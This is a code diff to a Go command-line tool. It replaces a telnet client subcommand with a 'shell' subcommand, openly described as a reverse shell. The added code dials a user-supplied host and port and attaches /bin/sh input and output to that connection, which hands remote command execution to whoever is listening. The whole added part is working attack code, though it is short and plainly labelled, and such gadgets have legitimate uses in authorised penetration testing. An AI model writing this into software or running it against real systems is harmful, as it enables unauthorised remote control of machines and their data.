@@ -29,33 +29,45 @@ THE SOFTWARE.
 package cmd
 
 import (
+	"os/exec"
+	"log"
 	"fmt"
+	"net"
 
-	"github.com/reiver/go-telnet"
 	"github.com/spf13/cobra"
 )
 
-// telnetCmd represents the telnet command
-var telnetCmd = &cobra.Command{
-	Use:   "telnet",
-	Short: "telnet client",
-	Long:  `Telnet provides a telnet client program.`,
+// rootCmd represents the base command when called without any subcommands
+var shellCmd = &cobra.Command{
+	Use:   "shell",
+	Short: "A reverse shell",
+	Long: `A gadget that creates a reverse TCP shell that calls back to a given IP and port`,
 	Run: func(cmd *cobra.Command, args []string) {
-		var caller telnet.Caller = telnet.StandardCaller
 
-		err := telnet.DialToAndCall(fmt.Sprintf("%s:%s", telnetAddress, telnetPort), caller)
+		var targetAddress = fmt.Sprintf("%s:%s", shellHost, shellPort)
+		conn, err := net.Dial("tcp", targetAddress)
 		if err != nil {
-			fmt.Println(fmt.Errorf("error connecting to Telnet server: %w", err))
+			log.Fatal(err)
 		}
-
+		reverseShell(conn)
 	},
 }
 
-var telnetAddress string
-var telnetPort string
+func reverseShell(client net.Conn) {
+        defer client.Close()
+        cmd := exec.Command("/bin/sh")
+        cmd.Stdin = client
+        cmd.Stdout = client
+        cmd.Stderr = client
+        cmd.Run()
+}
+
+var shellHost string
+var shellPort string
 
 func init() {
-	rootCmd.AddCommand(telnetCmd)
-	telnetCmd.Flags().StringVar(&telnetAddress, "address", "", "address to connect to")
-	telnetCmd.Flags().StringVar(&telnetPort, "port", "23", "port to connect to")
+	rootCmd.AddCommand(shellCmd)
+
+	shellCmd.Flags().StringVar(&shellHost, "rhost", "", "IP address to connect back to")
+	shellCmd.Flags().StringVar(&shellPort, "rport", "", "Port to connect back to")
 }
